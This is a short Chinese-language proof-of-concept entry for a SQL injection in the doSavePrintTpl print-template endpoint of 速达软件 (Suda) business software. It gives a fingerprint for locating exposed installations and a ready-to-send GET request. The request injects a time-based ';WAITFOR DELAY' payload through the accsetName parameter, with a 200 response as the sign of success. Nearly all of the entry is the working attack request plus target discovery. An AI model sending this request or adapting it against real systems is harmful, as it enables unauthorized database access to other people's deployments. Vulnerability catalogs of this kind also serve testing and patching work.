# 速达软件doSavePrintTpl存在sql注入漏洞

速达软件 ｜ SQL注入 ｜ —
- **指纹**：`body="速达软件技术"`
- **请求**：`GET /common/print/print!doSavePrintTpl.action?report=1&rptid=1&employId=1&accsetName=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&modId=1 HTTP/1.1`
- **响应特征**：200